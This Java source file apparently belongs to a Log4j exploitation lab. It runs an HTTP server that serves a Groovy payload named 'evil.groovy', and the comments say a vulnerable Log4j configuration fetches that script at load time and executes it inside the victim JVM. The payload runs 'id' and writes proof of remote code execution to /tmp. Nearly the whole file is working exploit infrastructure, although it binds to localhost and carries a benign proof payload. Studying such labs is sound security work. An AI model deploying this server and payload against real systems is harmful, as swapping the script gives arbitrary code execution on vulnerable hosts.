package lab;

import com.sun.net.httpserver.HttpServer;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.Charset;

/**
 * Serves the attacker's Groovy script. The victim's Log4j configuration interpolates a
 * lookup into a script path, so at configuration load time Log4j downloads this script
 * and executes it inside the application JVM.
 */
public final class ScriptServer {

    private static final String SCRIPT =
            "def p = 'id'.execute()\n"
                    + "p.waitFor()\n"
                    + "def proof = new File('/tmp/log4j-lab-pwned.txt')\n"
                    + "proof.text = 'RCE via log4j script (config-time lookup evaluation) in '\n"
                    + "        + java.lang.management.ManagementFactory.runtimeMXBean.name\n"
                    + "        + '\\n' + p.text\n"
                    + "println '=== PAYLOAD EXECUTED IN VICTIM JVM (script) ==='\n"
                    + "println proof.text\n"
                    + "println '=== END PAYLOAD ==='\n"
                    + "true\n";

    public static void main(final String[] args) throws Exception {
        final int port = Integer.getInteger("lab.httpPort", 8001);
        final HttpServer http = HttpServer.create(new InetSocketAddress("127.0.0.1", port), 0);
        http.createContext("/evil.groovy", ex -> {
            final byte[] body = SCRIPT.getBytes(Charset.forName("UTF-8"));
            System.out.println("SCRIPT <- GET " + ex.getRequestURI().getPath());
            ex.getResponseHeaders().add("Content-Type", "text/plain");
            ex.sendResponseHeaders(200, body.length);
            final OutputStream out = ex.getResponseBody();
            try {
                out.write(body);
            } finally {
                out.close();
            }
        });
        http.start();
        System.out.println("SCRIPT SERVER: http://127.0.0.1:" + port + "/evil.groovy");
        Runtime.getRuntime().addShutdownHook(new Thread(() -> http.stop(0)));
        Thread.currentThread().join();
    }

    private ScriptServer() {}
}
